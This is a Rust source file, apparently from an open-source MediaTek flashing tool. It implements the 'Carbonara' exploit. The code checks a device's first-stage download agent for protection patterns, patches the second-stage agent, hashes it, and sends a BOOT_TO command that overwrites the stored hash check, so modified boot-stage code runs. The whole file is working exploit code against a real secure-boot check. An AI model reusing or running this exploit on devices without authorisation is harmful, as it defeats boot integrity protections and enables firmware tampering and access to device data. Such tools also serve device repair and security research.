/*
    SPDX-License-Identifier: AGPL-3.0-or-later
    SPDX-FileCopyrightText: 2025 Shomy
*/
use std::time::Duration;

use log::{debug, info};
use sha2::{Digest, Sha256};
use tokio::time::timeout;

use crate::connection::port::ConnectionType;
use crate::da::{DA, DAEntryRegion, DAProtocol};
use crate::error::{Error, Result};
use crate::exploit::{BootStage, Exploit, ExploitMeta, rebuild_patched_da};

pub struct Carbonara {
    meta: ExploitMeta,
    patched_da: Option<DA>,
}

impl Default for Carbonara {
    fn default() -> Self {
        Self::new()
    }
}

impl Carbonara {
    pub fn new() -> Self {
        Carbonara {
            meta: ExploitMeta {
                name: String::from("Carbonara"),
                boot_mode: vec![ConnectionType::Brom, ConnectionType::Preloader],
                boot_stage: BootStage::Da1,
            },
            patched_da: None,
        }
    }

    async fn is_vulnerable(&self, da1: &DAEntryRegion) -> bool {
        // These patterns were taken from mtkclient
        let tests: [&[u8]; 4] = [
            b"\x01\x01\x54\xE3\x01\x14\xA0\xE3",
            b"\x08\x00\xA8\x52\xFF\x02\x08\xEB",
            b"\x06\x9B\x4F\xF0\x80\x40\x02\xA9",
            // "2nd DA address is invalid."
            b"\x32\x6E\x64\x20\x44\x41\x20\x61\x64\x64\x72\x65\x73\x73\x20\x69\x73\x20\x69\x6E\x76\x61\x6C\x69\x64\x2E",
        ];

        for pattern in tests.iter() {
            if da1.data.windows(pattern.len()).any(|w| w == *pattern) {
                debug!("[Carbonara] Found protection pattern, device not vulnerable");
                return false;
            }
        }
        debug!("[Carbonara] No protection patterns found, device potentially vulnerable");
        true
    }
}

#[async_trait::async_trait]
impl Exploit for Carbonara {
    async fn run(&mut self, protocol: &mut dyn DAProtocol) -> Result<bool> {
        let da = protocol.get_da();
        let da1 = da.get_da1().ok_or_else(|| Error::penumbra("DA1 region not found"))?;

        if !self.is_vulnerable(da1).await {
            return Err(Error::penumbra("Device is not vulnerable to Carbonara exploit"));
        }

        info!("[Exploit] Device is vulnerable to Carbonara! Cooking...");

        let hash_offset = match da.find_da_hash_offset() {
            Some(offset) => offset,
            None => return Err(Error::penumbra("Failed to find DA1 hash offset")),
        };
        debug!("[Exploit] Found DA1 hash offset at 0x{:X}", hash_offset);

        let da1_addr = da1.addr;

        let _ = da;

        // This emulates Ghidra behaviours (this is also required btw)
        // 0x2DEA4 -> 0x22DEA4
        let virtual_addr = hash_offset as u32 + da1_addr;

        let patched_da2 = protocol.patch_da2();

        let da = protocol.get_da();
        self.patched_da = Some(rebuild_patched_da(da, None, patched_da2.as_ref()));

        let mut hasher = Sha256::new();
        if let Some(ref da2) = patched_da2 {
            hasher.update(&da2.data[..da2.data.len().saturating_sub(da2.sig_len as usize)]);
        }

        let hash_result = hasher.finalize();
        debug!("[Exploit] Computed DA2 SHA256 hash: {:x}", hash_result);

        match timeout(
            Duration::from_secs(5),
            protocol.boot_to(virtual_addr, hash_result.as_slice()),
        )
        .await
        {
            Ok(_) => debug!("[Exploit] Sent Carbonara DA2 hash"),
            Err(e) => {
                return Err(Error::penumbra(format!("Failed to send BOOT_TO command: {}", e)));
            }
        }

        info!("[Exploit] Carbonara got served! Enjoy your meal ;)");

        Ok(true)
    }

    fn get_meta(&self) -> &ExploitMeta {
        &self.meta
    }

    fn get_patched_da(&self) -> Option<DA> {
        self.patched_da.clone()
    }
}
